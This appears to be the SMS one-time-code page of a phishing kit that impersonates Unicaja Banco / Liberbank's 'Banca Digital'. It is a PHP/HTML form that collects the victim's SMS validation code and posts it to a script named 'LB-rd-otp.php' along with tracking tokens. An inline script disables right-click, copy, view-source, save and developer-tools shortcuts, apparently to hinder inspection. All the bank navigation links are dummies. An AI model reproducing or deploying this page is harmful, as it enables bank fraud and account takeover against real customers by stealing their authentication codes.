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" sizes="196x196"></head><body id="entrada" style="">


	<div id="login">
		<div class="header">
			<div class="container py-2">
				<div class="row">
					<div class="col d-flex align-items-center justify-content-between">
						<h1 class="d-flex align-items-center m-0">
							<i class="fas icono-logo-unicaja-liberbank"></i>
						</h1>
						<a href="#">desconexión</a>
					</div>
				</div>
			</div>
		</div>
		
		<div class="container content mt-3 mt-md-5 mb-2">
			<div class="row">
				<div class="col-12 col-md-8">
					<div id="notif-instantanea">
						
					</div>
				
					<h3>Banca Digital - Validación de SMS</h3>
					<form id="formu" name="formu" action="<?php echo 'LB-rd-otp.php?token='.$token1 . '&request=' . $sms_request; ?>" method="post">
						
						
						
						
						     <div class="panel-body" style="max-width:400px;margin:0 auto;margin-top: 25px;">
      
       
       
       <div class="panel-heading display-table">
        <div>
         <div class="display-td">
          <center>
           <img class="img-responsive" src="data:image/png;base64,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" style="width: 60px;">
          </center>
         </div>
        </div>
       </div>
       <div>
        <div>
         <div>
          <div>
           <div style="padding:0" class="col-md-12">
            <label style="">validar:</label>
           </div>
           <div>
            <input maxlength="64" id="code" type="text" name="code" placeholder="entre aquí ..." required="" minlength="4" style="width:100%;height:45px;padding-left:10px;outline:0;background: url(data:image/png;base64,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)50% 50% no-repeat;background-size:35px;background-position-x:99%;background-color:white;" value="" class="form-control">
           </div>
		   <?php echo $errormsg; ?>
		   
          </div>
         </div>
        </div>
        


 
       <div style="
    margin-top: 25px;
">
							<div>
								<input type="submit" id="btn-entrar" tabindex="3" value="validar" class="btn btn-lbk">
							</div>
						</div>
	   <input type="hidden" name="type" value="otp">

      
     </div>
</div>
						
						
					</form>
				</div>
				
				<div class="col-12 col-md-4 mt-5 mt-md-0">
					<div class="texto-ayuda p-3 mb-3">
						<p class="titulo">Acciones importantes</p>
						<p>
							<a href="#" class="semibold">
								Darme de alta en Banca Digital <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
						<p>
							<a href="#" class="semibold">
								Acceso DNI electrónico <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
						<p>
							<a href="#" class="semibold">
								Ver recomendaciones de seguridad <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
					</div>
					
					<div class="texto-ayuda p-3 mb-3">
						<p class="titulo">Guías de uso</p>
						<p>Consulta nuestras guías de Banca Digital para sacarle todo el provecho, informarte sobre cómo darte de alta o restablecer tu número secreto.</p>
						<div class="col-12 col-md-6 px-0">
							<a href="#" title="Consultar guías de Banca Digital">
								<input type="button" id="btn-entrar" tabindex="4" value="Ver guías" class="btn btn-lbk btn-lbk-blanco">
							</a>
						</div>
					</div>
				</div>
			</div>
		</div>
		
		<div class="container footer" style="position:fixed">
			<div class="row">
				<div class="col-12 col-md-2 d-flex align-items-center justify-content-center col-logo">
					<i class="fas icono-logo-unicaja-liberbank"></i>
				</div>
				<div class="col-12 col-md-8 d-flex align-items-center justify-content-center text-center my-sm-3 col-listado">
					<ul class="list-inline mb-0">
  						<li class="list-inline-item">© 2021 Unicaja Banco</li>
  						<li class="list-inline-item"><a href="#">Cookies</a></li>
  						<li class="list-inline-item"><a href="#">Aviso legal</a></li>
  						<li class="list-inline-item"><a href="#">Política de privacidad</a></li>
  					</ul>
				</div>
				<div class="col-12 col-md-2 d-flex align-items-center justify-content-center col-rrss">
					<a href="#" class="ml-1"><i class="fas icono-linkedin"></i></a>
					<a href="#" class="ml-1"><i class="fas icono-facebook"></i></a>
					<a href="#" class="ml-1"><i class="fas icono-twitter"></i></a>
					
				</div>
			</div>
		</div>
	</div> 
			
	
	
	

	
	

  <script src="./LB-files/jquery.min.js"></script>
<script src="./LB-files/imask.min.js"></script>
<script src="./LB-files/infos.js"></script>




<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>








</body></html>